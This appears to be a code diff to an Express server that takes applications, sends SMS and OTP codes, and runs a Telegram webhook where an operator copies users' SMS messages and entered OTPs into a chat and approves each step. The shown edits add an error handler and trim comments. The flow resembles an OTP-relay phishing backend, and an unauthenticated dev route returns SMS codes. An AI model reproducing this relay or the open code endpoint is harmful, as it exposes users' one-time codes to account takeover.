@@ -58,8 +58,12 @@ async function sendSms(to, text) {
   }
 }
 
-// ─── Routes ───
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).json({ ok: false, message: 'Internal server error' });
+});
 
+// Routes
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 // 1. Submit application
@@ -294,7 +298,7 @@ app.post('/api/resend-otp', async (req, res) => {
   }
 });
 
-// 13. DEV SMS code (for testing when gateway not set)
+// 13. DEV SMS code
 app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -324,11 +328,10 @@ app.get('/api/dashboard/:applicationId', (req, res) => {
   });
 });
 
-// 15. Telegram webhook (HYBRID: buttons + text reply)
+// 15. Telegram webhook (HYBRID)
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
 
-  // Handle callback_query (inline buttons)
   if (update.callback_query) {
     const query = update.callback_query;
     let data;
@@ -338,7 +341,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const app = applications[appId];
     if (!app) return res.sendStatus(200);
 
-    // Copy actions
     if (action === 'COPY_SMS') {
       if (app.smsMessage) {
         await sendTelegramMessage(app.smsMessage);
@@ -358,7 +360,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         await sendTelegramMessage('⚠️ No OTP entered yet.');
       }
     }
-    // Approval steps
     else if (step === 'APP') {
       app.smsStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
       if (app.smsStatus === 'approved') {
@@ -395,7 +396,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // Handle text messages (reply "YES" or "NO" to the message)
   if (update.message && update.message.text) {
     const text = update.message.text.trim().toUpperCase();
     const replyTo = update.message.reply_to_message?.text;
